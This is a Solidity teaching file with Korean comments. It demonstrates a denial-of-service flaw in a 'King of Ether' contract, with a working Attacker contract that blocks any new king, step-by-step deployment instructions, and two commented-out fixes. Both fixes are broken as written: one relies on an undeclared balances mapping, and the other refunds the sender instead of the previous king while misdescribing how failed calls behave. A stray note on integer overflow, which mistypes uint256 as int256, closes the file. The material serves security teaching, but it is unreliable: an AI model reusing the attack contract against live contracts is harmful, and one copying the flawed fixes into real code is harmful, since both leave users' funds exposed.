pragma solidity ^0.6.0;

/* 시나리오: 최대 ether를 지불하는 계정을 king으로 선출, 이전 king에게는 ether 반환 */

contract KingOfEther {
    address public king;	                            // king의 주소 (현재까지 최대 금액을 지불한 계정의 주소)
    uint public highestPay;	// 현재 king이 지불한 금액

    function claimThrone() external payable {
        require(msg.value > highestPay,                 // (1) Check: 송금받은 금액이 highestPay보다 커야 함
            "Need to pay more to become the king");     // 송금받은 금액이 highestPay보다 작으면 revert 발생
									
        (bool sent, bytes memory data) = 
            king.call {value: msg.value} ("");		    // (2) Interaction: 송금받은 금액이 highestPay보다 크면 현재 king에게 지불했던 금액을 반환
        require(sent, "Failed to send Ether");			// 반환이 실패할 경우 revert 발생 (이후 코드는 실행이 안됨)

        king = msg.sender;							    // (3) Effect: king을 교체
        highestPay = msg.value;						    // 최대 지불 금액을 갱신
    }
}

contract Attacker {								        // receive함수와 fallback 함수가 없어 이더 수신 불가능
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) public {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone {value: msg.value} ();	// msg.value 금액으로 calimThrone 함수 호출
    }
}

/* 컨트랙트 실행을 통한 확인
(1) KingOfEther 배포 
(2) KingOfEther 주소값 복사 및 Attacker 배포 (KingOfEther 주소값을 파라미터로 입력)
(3) 생성자 주소로 claimThrone( ) 실행 (300 wei 송금)
    (3-1) king 및 highestPay 확인
(4) Attack 계정으로 attack() 실행 (400 wei 송금)
    (4-1) king 및 highestPay 확인
(5) 생성자 주소로 claimThrone( ) 실행 (500 wei 송금) --> 예외 발생 및 king 교체 실패
    (5-1) balance 및 king 확인
*/

// 해결방법 1. KingOfEther에 사용자가 직접 ether를 회수하는 함수를 제공 
    /*
    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call.value(amount)("");
        require(sent, "Failed to send Ether");
    }
    */
    
// 해결방법 2. Checks-Effects-Interactions 패턴 사용 (상태를 먼저 갱신한 후 이더를 반환)
    /*
    function claimThrone() external payable {
        require(msg.value > highestPay,                 // (1) Check: 송금받은 금액이 highestPay보다 커야 함
            "Need to pay more to become the king");     // 송금받은 금액이 highestPay보다 작으면 revert 발생

        king = msg.sender;							    // (2) Effect: king 교체
		highestPay = msg.value;						    // 최대 지불액을 갱신
        
        (bool sent, bytes memory data) = 
            king.call {value: msg.value} ("");		    // (3) Interaction: 송금받은 금액이 highestPay보다 크면 현재 king이 지불한 금액을 반환
						                                // call 함수가 실패해도 revert가 발생하지 않음
    }
    */

// 오버플로우 또는 언더플로우 공격을 방지하기 위해서는 자료형이 표현할 수 있는 최대값과 최소값을 정확하게 이해하고 있어야 하며,

// 작업을 수행한 후에 변수의 값이 유효한 지를 확인하는 것이 바람직하다.

// 정수형 int8, int16, int24, int32, … int256와 uint8, uint16, uint24, uint32, … int256 변수의 최소값과 최대값은 각각 얼마인가?
